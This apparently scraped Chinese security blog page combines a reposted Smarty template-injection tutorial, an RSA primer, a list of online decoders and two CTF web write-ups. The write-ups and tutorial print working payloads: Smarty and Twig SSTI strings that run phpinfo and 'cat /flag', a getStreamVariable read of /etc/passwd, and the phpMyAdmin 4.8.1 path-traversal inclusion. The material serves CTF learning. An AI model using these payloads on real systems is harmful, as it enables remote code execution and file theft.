<p>因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。</p>
<p><strong>3. {literal}</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;phpinfo();&lt;/script&gt;   </span><br></pre></td></tr></table></figure>

<p>这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233719367-1535357026.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820233719367-1535357026.png" alt="img"></a></p>
<p><strong>4.</strong> <strong>getstreamvariable</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:///etc/passwd&quot;)&#125;</span><br></pre></td></tr></table></figure>

<p>Smarty类的getStreamVariable方法的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function getStreamVariable($variable)</span><br><span class="line">&#123;</span><br><span class="line">        $_result = &#x27;&#x27;;</span><br><span class="line">        $fp = fopen($variable, &#x27;r+&#x27;);</span><br><span class="line">        if ($fp) &#123;</span><br><span class="line">            while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) &#123;</span><br><span class="line">                $_result .= $current_line;</span><br><span class="line">            &#125;</span><br><span class="line">            fclose($fp);</span><br><span class="line">            return $_result;</span><br><span class="line">        &#125;</span><br><span class="line">        $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this;</span><br><span class="line">        if ($smarty-&gt;error_unassigned) &#123;</span><br><span class="line">            throw new SmartyException(&#x27;Undefined stream variable &quot;&#x27; . $variable . &#x27;&quot;&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234305773-495371489.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234305773-495371489.png" alt="img"></a></p>
<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<p><strong>5. {if}{&#x2F;if}</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;if phpinfo()&#125;&#123;/if&#125;</span><br></pre></td></tr></table></figure>

<p>Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{&#x2F;if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||<em>，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{&#x2F;if}</em></p>
<p>既然这样就将XFF头改为 {if phpinfo()}{&#x2F;if} ：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234610811-341143885.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234610811-341143885.png" alt="img"></a></p>
<p>同样还能用来执行一些系统命令：</p>
<p><a target="_blank" rel="noopener" href="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234755671-2008092498.png"><img src="https://img2020.cnblogs.com/blog/1344396/202008/1344396-20200820234755671-2008092498.png" alt="img"></a></p>
<p><strong>CTF漏洞成因</strong></p>
<p>本题中引发SSTI的代码简化后如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    require_once(&#x27;./smarty/libs/&#x27; . &#x27;Smarty.class.php&#x27;);</span><br><span class="line">    $smarty = new Smarty();</span><br><span class="line">    $ip = $_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line">    $smarty-&gt;display(&quot;string:&quot;.$ip);     // display函数把标签替换成对象的php变量；显示模板</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<p>为转载，原博客为：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">1. SSTI（模板注入）漏洞（入门篇） - bmjoker - 博客园 (cnblogs.com)</a></p>
</blockquote>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/13/%E5%AF%86%E7%A0%81/rsa/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/13/%E5%AF%86%E7%A0%81/rsa/" class="post-title-link" itemprop="url">rsa</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-05-13 21:02:32 / 修改时间：21:04:15" itemprop="dateCreated datePublished" datetime="2024-05-13T21:02:32+08:00">2024-05-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>RSA加密算法是一种非对称加密算法。RSA是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。当时他们三人都在麻省理工学院工作。RSA就是他们三人姓氏开头字母拼在一起组成的。</p>
<p>1973年，在英国政府通讯总部工作的数学家克利福德·柯克斯（Clifford Cocks）在一个内部文件中提出了一个相同的算法，但他的发现被列入机密，一直到1997年才被发表。</p>
<p><strong>对极大整数做因数分解的难度决定了RSA算法的可靠性。</strong> 换言之，对一极大整数做因数分解愈困难，RSA算法愈可靠。<strong>假如有人找到一种快速因数分解的算法的话，那么用RSA加密的信息的可靠性就肯定会极度下降。</strong> 但找到这样的算法的可能性是非常小的。今天只有短的RSA钥匙才可能被强力方式解破。到目前为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。</p>
<h2 id="一、举一个通俗易懂的例子"><a href="#一、举一个通俗易懂的例子" class="headerlink" title="一、举一个通俗易懂的例子"></a>一、举一个通俗易懂的例子</h2><p>看一个数学小魔术：</p>
<p><strong>让A写下一个任意3位数，并将这个数和91相乘；然后将积的最后三位数告诉B，这样B就可以计算出A写下的是什么数字了。</strong></p>
<ul>
<li>比如A写下的是123，并且A计算出123 * 91等于11193，并把结果的末三位193告诉B ；</li>
<li>B只需要把193再乘以11，193 * 11 &#x3D; 2123 末三位就是A写下的数字了；</li>
</ul>
<p><strong>道理很简单，91乘以11等于1001，而任何一个三位数乘以1001后，末三位显然都不变（例如123乘以1001就等于123123）。</strong></p>
<p>知道原理后，可以构造一个定义域和值域更大的加密解密系统。<br>例如：</p>
<ul>
<li>任意一个数乘以400000001后，末8位都不变，而400000001 &#x3D; 19801 * 20201。于是A来乘以19801，B来乘以20201，又一个加密解密不对称的系统就构造好了；</li>
<li>甚至可以构造得更大一些 4000000000000000000000000000001 &#x3D; 1199481995446957 * 3334772856269093，这样我们就成功构造了一个30位的加密系统；</li>
</ul>
<p>如果仅仅按照上面的思路，如果对方知道原理，非常容易穷举出400000001这个目标值；<strong>RSA算法使用的是指数和取模运算，本质上就是上面这套思想。</strong></p>
<p>此段落转载自：<br><a target="_blank" rel="noopener" href="https://www.zhihu.com/question/33645891">如何用通俗易懂的话来解释非对称加密?</a></p>
<h2 id="二、一句话："><a href="#二、一句话：" class="headerlink" title="二、一句话："></a>二、一句话：</h2><p>对极大整数做因数分解的难度决定了RSA算法的可靠性。</p>
<h2 id="三、RSA加密算法"><a href="#三、RSA加密算法" class="headerlink" title="三、RSA加密算法"></a>三、RSA加密算法</h2><h3 id="3-1、维基百科——RSA加密算法"><a href="#3-1、维基百科——RSA加密算法" class="headerlink" title="3.1、维基百科——RSA加密算法"></a>3.1、维基百科——RSA加密算法</h3><p>先看一下维基百科的算法描述：</p>
<h4 id="公钥与私钥的产生"><a href="#公钥与私钥的产生" class="headerlink" title="公钥与私钥的产生"></a>公钥与私钥的产生</h4><ul>
<li>1、随意选择两个大的质数 p和 q，p不等于 q，计算 N&#x3D;pq</li>
<li>2、根据欧拉函数，求得 r</li>
</ul>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = φ(N) = φ(p)φ(q) = (p-<span class="number">1</span>)(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d （ ed ≡ 1(mod r) 模反元素存在，当且仅当e与r互质 ）；</li>
<li>4、销毁p和q，此时 (N , e)是公钥，(N, d)为私钥；</li>
</ul>
<h4 id="加密消息"><a href="#加密消息" class="headerlink" title="加密消息"></a>加密消息</h4><p>假设Bob想给Alice发送一个消息 <code>n</code>，他知道Alice产生的 <code>N</code>和 <code>e</code> ；用下面这个公式他可以将 <code>n</code>加密为 <code>c</code> ：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">c ≡ n^e (<span class="built_in">mod</span> N)</span><br></pre></td></tr></table></figure>

<p>计算 <code>c</code>并不复杂。Bob算出 <code>c</code>后就可以将它传递给Alice。</p>
<h4 id="解密消息"><a href="#解密消息" class="headerlink" title="解密消息"></a>解密消息</h4><p>Alice得到Bob的消息 <code>c</code>后就可以利用她的密钥<code>d</code>来解码。可以用以下这个公式来将 <code>c</code>转换为 <code>n</code>：</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">n ≡ c^d (<span class="built_in">mod</span> N)</span><br></pre></td></tr></table></figure>

<p>此段落转载自：<br><a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/RSA%E5%8A%A0%E5%AF%86%E6%BC%94%E7%AE%97%E6%B3%95">维基百科——RSA加密算法</a></p>
<h3 id="3-2、依照算法公式举个例子"><a href="#3-2、依照算法公式举个例子" class="headerlink" title="3.2、依照算法公式举个例子"></a>3.2、依照算法公式举个例子</h3><p>依照算法公式来举个例子</p>
<h4 id="1、随意选择两个大的质数-p和-q，p不等于-q，计算-N-pq"><a href="#1、随意选择两个大的质数-p和-q，p不等于-q，计算-N-pq" class="headerlink" title="1、随意选择两个大的质数 p和 q，p不等于 q，计算 N&#x3D;pq"></a>1、随意选择两个大的质数 p和 q，p不等于 q，计算 N&#x3D;pq</h4><p><strong>质数</strong> 定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">除了1和该数自身外，无法被其他自然数整除的数。</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">p</span> = <span class="number">3</span>；</span><br><span class="line"><span class="attr">q</span> = <span class="number">5</span><span class="comment">;</span></span><br><span class="line"><span class="attr">N</span> = <span class="number">3</span>*<span class="number">5</span> = <span class="number">15</span><span class="comment">;</span></span><br></pre></td></tr></table></figure>

<h4 id="2、根据欧拉函数，求得-r"><a href="#2、根据欧拉函数，求得-r" class="headerlink" title="2、根据欧拉函数，求得 r"></a>2、根据欧拉函数，求得 r</h4><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = φ(N) = φ(p)φ(q) = (p-<span class="number">1</span>)(q-<span class="number">1</span>)。</span><br></pre></td></tr></table></figure>

<p><strong>欧拉函数</strong> 定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">欧拉函数 φ(n)是小于或等于n的正整数中与n互质的数的数目。</span><br><span class="line"></span><br><span class="line">例如：φ(8) = 4，因为1,3,5,7均和8互质。</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">r</span> = φ(N) = φ(p)φ(q) = (p-<span class="number">1</span>)(q-<span class="number">1</span>) <span class="comment">;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">r</span> = φ(<span class="number">15</span>) = φ(<span class="number">3</span>)φ(<span class="number">5</span>) = (<span class="number">3</span>-<span class="number">1</span>)(<span class="number">5</span>-<span class="number">1</span>) <span class="comment">;</span></span><br><span class="line"><span class="attr">r</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure>

<h4 id="3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d-（-ed-≡-1-mod-r-模反元素存在，当且仅当e与r互质-）；"><a href="#3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d-（-ed-≡-1-mod-r-模反元素存在，当且仅当e与r互质-）；" class="headerlink" title="3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d （ ed ≡ 1(mod r) 模反元素存在，当且仅当e与r互质 ）；"></a>3、选择一个小于r并与r互质的整数e，求得e关于r的模反元素，命名为d （ ed ≡ 1(mod r) 模反元素存在，当且仅当e与r互质 ）；</h4><p><strong>互质</strong> 定义：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果两个或两个以上的整数的最大公约数是 1，则称它们为互质</span><br><span class="line"></span><br><span class="line">例如：1,3,5,7均和8互质</span><br></pre></td></tr></table></figure>

<p><strong>模反元素</strong> 定义：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">如果两个正整数a和n互质，那么一定可以找到整数b，使得 ab-<span class="number">1</span> 被n整除，或者说ab被n除的余数是<span class="number">1</span>。</span><br><span class="line"></span><br><span class="line">例如：比如<span class="number">3</span>和<span class="number">5</span>互质，<span class="number">3</span>关于<span class="number">5</span>的模反元素就可能是<span class="number">2</span>，因为 (<span class="number">3</span>*<span class="number">2</span>)%5=<span class="number">1</span> 。</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 选择一个小于r并与r互质的整数e (1,3,5,7均和8互质)：</span></span><br><span class="line">e = <span class="number">7</span>;</span><br><span class="line"><span class="comment">// 求得e关于r的模反元素，命名为d （    ed ≡ 1(mod r)     ) </span></span><br><span class="line"></span><br><span class="line">ed ≡ <span class="number">1</span>(<span class="keyword">mod</span> r) ;</span><br><span class="line"></span><br><span class="line"><span class="number">7</span>*d ≡ <span class="number">1</span>(<span class="keyword">mod</span> <span class="number">8</span>) ;</span><br><span class="line"><span class="number">7</span>*d%<span class="number">8</span> = <span class="number">1</span>; </span><br><span class="line"><span class="comment">// 这里取d = 15</span></span><br><span class="line">d = <span class="number">15</span>；</span><br></pre></td></tr></table></figure>

<h4 id="4、销毁p和q，此时-N-e-是公钥，-N-d-为私钥"><a href="#4、销毁p和q，此时-N-e-是公钥，-N-d-为私钥" class="headerlink" title="4、销毁p和q，此时 (N , e)是公钥，(N, d)为私钥"></a>4、销毁p和q，此时 (N , e)是公钥，(N, d)为私钥</h4><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 公钥  (N , e)</span></span><br><span class="line">( <span class="number">15</span>,<span class="number">7</span> )</span><br><span class="line"><span class="comment">// 私钥 (N, d)</span></span><br><span class="line">( <span class="number">15</span>,<span class="number">15</span> )</span><br></pre></td></tr></table></figure>

<h4 id="5、加密"><a href="#5、加密" class="headerlink" title="5、加密"></a>5、加密</h4><p>假设Bob想给Alice发送一个消息 <code>n</code>，他知道Alice产生的 <code>N</code>和 <code>e</code> ；用下面这个公式他可以将 <code>n</code>加密为 <code>c</code></p>
<p>举例：</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// 假设 </span><br><span class="line">n = <span class="number">2</span>;</span><br><span class="line"><span class="regexp">//</span> 计算c</span><br><span class="line">c ≡ n^e (mod N) ;</span><br><span class="line"></span><br><span class="line">(c^-<span class="number">1</span> * n^e)%N = <span class="number">1</span> ; </span><br><span class="line">(c^-<span class="number">1</span> * <span class="number">2</span>^<span class="number">7</span>)%15 = <span class="number">1</span> ;</span><br><span class="line"><span class="regexp">//</span> </span><br><span class="line">c = <span class="number">8</span>；</span><br></pre></td></tr></table></figure>

<h4 id="6、解密"><a href="#6、解密" class="headerlink" title="6、解密"></a>6、解密</h4><p>Alice得到Bob的消息 <code>c</code>后就可以利用她的密钥<code>d</code>来解码。可以用以下这个公式来将 <code>c</code>转换为 <code>n</code>：</p>
<p>举例：</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算n</span></span><br><span class="line">n ≡ c^<span class="title function_ invoke__">d</span> (<span class="keyword">mod</span> N)</span><br><span class="line"></span><br><span class="line">n ≡ <span class="number">8</span>^<span class="number">15</span> (<span class="keyword">mod</span> <span class="number">15</span>) ；</span><br><span class="line">(n^-<span class="number">1</span> * <span class="number">8</span>^<span class="number">15</span>)%<span class="number">15</span> = <span class="number">1</span> ;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">n = <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/13/%E5%AF%86%E7%A0%81/%E5%AF%86%E7%A0%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/13/%E5%AF%86%E7%A0%81/%E5%AF%86%E7%A0%81/" class="post-title-link" itemprop="url">密码</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-05-13 20:58:12 / 修改时间：20:58:51" itemprop="dateCreated datePublished" datetime="2024-05-13T20:58:12+08:00">2024-05-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>常用的base编码、url编码等以及各种加密都有</p>
<p><a target="_blank" rel="noopener" href="http://www.hiencode.com/">http://www.hiencode.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://tool.lu/">https://tool.lu/</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tools.html">https://ctf.bugku.com/tools.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.ctftools.com/down/">https://www.ctftools.com/down/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.idcd.com/">https://www.idcd.com/</a></p>
<p>bugku的旧在线工具可以用来枚举栅栏密码和凯撒密码</p>
<p>md5解密</p>
<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">https://www.cmd5.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">https://www.somd5.com/</a></p>
<p><a target="_blank" rel="noopener" href="https://pmd5.com/">https://pmd5.com/</a></p>
<p>维吉尼亚解密</p>
<p>很多时候可以直接跑出明文</p>
<p><a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver">https://www.guballa.de/vigenere-solver</a></p>
<p><a target="_blank" rel="noopener" href="https://www.dcode.fr/vigenere-cipher">https://www.dcode.fr/vigenere-cipher</a> (要科学上网)</p>
<p>rot5&#x2F;13&#x2F;18&#x2F;47</p>
<p><a target="_blank" rel="noopener" href="https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php">https://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p>
<p>emoji加密</p>
<p>常见的就是base100和emoji-aes</p>
<p><a target="_blank" rel="noopener" href="https://aghorler.github.io/emoji-aes/">https://aghorler.github.io/emoji-aes/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=937">http://www.atoolbox.net/Tool.php?Id=937</a></p>
<p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/tool/base100">https://ctf.bugku.com/tool/base100</a></p>
<p>brainfuck&#x2F;Ook！</p>
<p><a target="_blank" rel="noopener" href="https://www.splitbrain.org/services/ook">https://www.splitbrain.org/services/ook</a></p>
<p>零宽字符解密</p>
<p><a target="_blank" rel="noopener" href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p><a target="_blank" rel="noopener" href="https://yuanfux.github.io/zero-width-web/">https://yuanfux.github.io/zero-width-web/</a></p>
<p><a target="_blank" rel="noopener" href="http://www.atoolbox.net/Tool.php?Id=829">http://www.atoolbox.net/Tool.php?Id=829</a></p>
<p>熊曰&#x2F;兽音&#x2F;佛曰</p>
<p><a target="_blank" rel="noopener" href="http://hi.pcmoe.net/index.html">http://hi.pcmoe.net/index.html</a></p>
<p>需要key的佛曰</p>
<p><a target="_blank" rel="noopener" href="https://talk-with-buddha.netlify.app/">https://talk-with-buddha.netlify.app/</a></p>
<p>解音频里的莫斯密码</p>
<p><a target="_blank" rel="noopener" href="https://morsecode.world/international/decoder/audio-decoder-adaptive.html">https://morsecode.world/international/decoder/audio-decoder-adaptive.html</a></p>
<p>Quoted-printable</p>
<p><a target="_blank" rel="noopener" href="http://web.chacuo.net/charsetquotedprintable/">http://web.chacuo.net/charsetquotedprintable/</a></p>
<p>Rabbit解码</p>
<p><a target="_blank" rel="noopener" href="https://www.sojson.com/encrypt_rabbit.html">https://www.sojson.com/encrypt_rabbit.html</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-Cookie-is-so-stable/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/BJDCTF2020-Cookie-is-so-stable/" class="post-title-link" itemprop="url">[BJDCTF2020]Cookie is so stable</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2024-05-13 19:18:54 / 修改时间：21:44:22" itemprop="dateCreated datePublished" datetime="2024-05-13T19:18:54+08:00">2024-05-13</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>哈哈哈哈</p>
<p>我tm来了！！！！</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211118650.png" alt="image-20240513211118650"></p>
<p>输入1</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211326516.png" alt="image-20240513211326516"></p>
<p>看了源码，没有js获取元素，猜测是用的cookie</p>
<p>抓包看看</p>
<p>输入1</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211709990.png" alt="image-20240513211709990"></p>
<p>输入2</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211733766.png" alt="image-20240513211733766"></p>
<p>cookie is stable实不欺我</p>
<p>那是什么在变呢？</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513211828916.png" alt="image-20240513211828916"></p>
<p>是这个</p>
<p>那我如果直接改会怎么样呢？</p>
<p>发现会变到cookie里去</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240513212127489.png" alt="image-20240513212127489"></p>
<p>emm</p>
<p>那我怎么拿到东西呢？</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!-- Why not take a closer look at cookies? --&gt;</span><br></pre></td></tr></table></figure>

<p>？？？</p>
<p>什么意思</p>
<p><img src="https://img-blog.csdnimg.cn/20201102181051434.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>登登</p>
<p>模版注入</p>
<p>主要是我sql和rce试过了</p>
<p>都不行，就拿这个用了</p>
<p>尝试一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>twig模版注入</p>
<p>拿到flag</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="why">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="why">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | why">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2024/05/13/buu%E5%88%B7%E9%A2%98%E9%9B%86-web/GWCTF-2019-%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/" class="post-title-link" itemprop="url">[GWCTF 2019]我有一个数据库</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2024-05-13 19:03:14" itemprop="dateCreated datePublished" datetime="2024-05-13T19:03:14+08:00">2024-05-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2024-05-14 15:07:24" itemprop="dateModified" datetime="2024-05-14T15:07:24+08:00">2024-05-14</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145231899.png" alt="image-20240514145231899"></p>
<p>除此之外啥也没有，猜测是文件泄露</p>
<p>dir扫描发现phpmyadmin可以进入</p>
<p>进入之后</p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145323308.png" alt="image-20240514145323308"></p>
<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240514145636934.png" alt="image-20240514145636934"></p>
<p>这个时候就需要介绍一下4.8.1的专属漏洞</p>
<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/0d75017c154f">phpmyadmin4.8.1远程文件包含漏洞（CVE-2018-12613） - 简书</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog">【首发】phpmyadmin4.8.1后台getshell</a> </p>
<p>两位大神，已经讲得很详细了</p>
<p>emm，简单来说，emm也不简单</p>
<p>就是有一个白名单，只要是白名单就可以进入，但是因为phpmyadmin人太好了，所以让我们传后面的参数，但是要使用？隔开</p>
<p>所以payload：</p>
<p>?target&#x3D;db_sql.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag</p>
<p>很多题解都要把问号二次url编码</p>
